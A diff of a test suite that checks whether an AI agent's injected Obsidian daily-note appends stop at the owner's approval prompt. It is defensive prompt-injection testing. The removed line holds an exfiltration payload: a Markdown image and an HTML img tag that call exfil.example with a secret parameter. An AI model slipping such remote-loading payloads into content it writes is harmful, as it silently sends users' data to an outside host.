@@ -1250,13 +1250,13 @@ describe("the real gdrive_file_create row: an injected save to a shared folder s
 
 // ---- B4b: the Obsidian daily-note append (plan Task B6) ----------------------------------------
 
-describe("the real obsidian_append_to_daily_note row: an injected remote image stops at the owner's prompt (B4b)", () => {
+describe("the real obsidian_append_to_daily_note row: an injected append stops at the owner's prompt (B4b)", () => {
   const TYPE = "obsidian.note.append";
   const TAIL_MARKER = "NOTE-TAIL-MARKER-b4b1";
-  // Obsidian renders Markdown images and HTML in reading view: this would load when the owner opens
-  // the note. B3r (remote content) is not on main yet, so the guard here is the owner's prompt,
-  // which shows the content verbatim and the end of the note it lands in.
-  const CONTENT = "![](https://exfil.example/?d=secret) <img src=//exfil.example/x>";
+  // An append with no remote content (a plain link) reaches the owner's prompt, which shows the
+  // content verbatim and the end of the note it lands in. One that would load remote content (a
+  // Markdown image, inline HTML) is refused before any prompt since B3r (the suite below).
+  const CONTENT = "- standup done; notes at [the doc](https://example.com/notes)";
   const DOOR: RealRowDoor = {
     toolId: "obsidian_append_to_daily_note",
     instruction:
